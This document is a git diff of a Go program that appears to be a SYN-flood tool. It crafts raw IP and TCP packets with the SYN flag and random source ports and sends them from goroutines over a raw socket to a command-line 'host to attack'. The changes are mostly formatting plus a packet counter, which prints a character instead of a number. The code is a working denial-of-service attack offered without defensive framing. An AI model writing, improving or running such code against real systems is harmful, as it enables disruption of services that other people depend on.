@@ -11,16 +11,15 @@ import (
 	"syscall"
 )
 
-func argParser() (host string, port int) {
-	host = *(flag.String("host", "", "Host to attack."))
-	port = *(flag.Int("port", 0, "lol"))
+func argParser() (string, int) {
+	host := flag.String("host", "", "Host to attack.")
+	port := flag.Int("port", 0, "lol")
 
 	flag.Parse()
-	return host, port
+	return *host, *port
 }
 
-
-func main(){
+func main() {
 	// Creating argv parsing
 	HOST, PORT := argParser()
 	log.Printf("Host and Port: {%s:%d}\n", HOST, PORT)
@@ -30,7 +29,7 @@ func main(){
 	// printing about it in stderror
 	AIP := net.ParseIP(HOST).To4()
 	if AIP == nil {
-		log.Fatal("Invalid Hostname: " + HOST )
+		log.Fatal("Invalid Hostname: " + HOST)
 	} else {
 		handle(AIP, PORT)
 	}
@@ -48,8 +47,9 @@ func handle(ip net.IP, port int) {
 		log.Fatal(err.Error())
 	}
 
+	totalSend := 0
 	for i := 0; i < 3; i++ {
-		go func(){
+		go func() {
 			srcIp := net.IP(make([]byte, 4))
 
 			ipByte := ipHeader{}
@@ -71,45 +71,45 @@ func handle(ip net.IP, port int) {
 			sockAddr := syscall.SockaddrInet4{}
 			sockAddr.Port = port
 			copy(sockAddr.Addr[:4], ip)
-			fmt.Printf("Sendto %v %v ",ip,port )
+			totalSend++
+			fmt.Print("Total pockets send: " + string(rune(totalSend)) + "\r")
 			err = syscall.Sendto(sock, buff, 0, &sockAddr)
-			if err != nil{
-				fmt.Println("Sendto error:\t" + err.Error() )
+			if err != nil {
+				fmt.Println("Sendto error:\t" + err.Error())
 			}
 		}()
 	}
 	c := make(chan int, 1)
-	<- c
+	<-c
 }
 
-func (h *ipHeader) makeHeader(srcIp net.IP, dstIp net.IP) ([]byte, error){
-	h.PID		= 1
-	h.TTL		= 255
-	h.Proto		= syscall.IPPROTO_TCP
-	h.HCheckSum	= 0
-	h.SRCip		= srcIp
-	h.DSTip		= dstIp
+func (h *ipHeader) makeHeader(srcIp net.IP, dstIp net.IP) ([]byte, error) {
+	h.PID = 1
+	h.TTL = 255
+	h.Proto = syscall.IPPROTO_TCP
+	h.HCheckSum = 0
+	h.SRCip = srcIp
+	h.DSTip = dstIp
 
 	return h.Marshal()
 }
 
-func (header *tcpHeader) makeHeader(srcIp, destIp net.IP, destPort int) ([]byte, error){
-	header.DestPort		= destPort
-	header.Flag			= 0x02
-	header.AckNum		= 0
+func (header *tcpHeader) makeHeader(srcIp, destIp net.IP, destPort int) ([]byte, error) {
+	header.DestPort = destPort
+	header.Flag = 0x02
+	header.AckNum = 0
 
-	header.Window		= 2048
-	header.SourcePort	= rand.Intn(65000)
-	header.SeqNum		= rand.Intn(1 << 32 - 1)
-
+	header.Window = 2048
+	header.SourcePort = rand.Intn(65000)
+	header.SeqNum = rand.Intn(1<<32 - 1)
 
 	var pseudoH *pseudoHeader = &pseudoHeader{}
 	copy(pseudoH.SourceIp[:4], srcIp)
 	copy(pseudoH.DestIp[:4], destIp)
 
-	pseudoH.ProtoType	= syscall.IPPROTO_TCP
-	pseudoH.SegLen		= uint16(20)
-	pseudoH.Fixed 		= 0
+	pseudoH.ProtoType = syscall.IPPROTO_TCP
+	pseudoH.SegLen = uint16(20)
+	pseudoH.Fixed = 0
 
 	var buffer = bytes.Buffer{}
 	if err := binary.Write(&buffer, binary.BigEndian, pseudoH); err != nil {
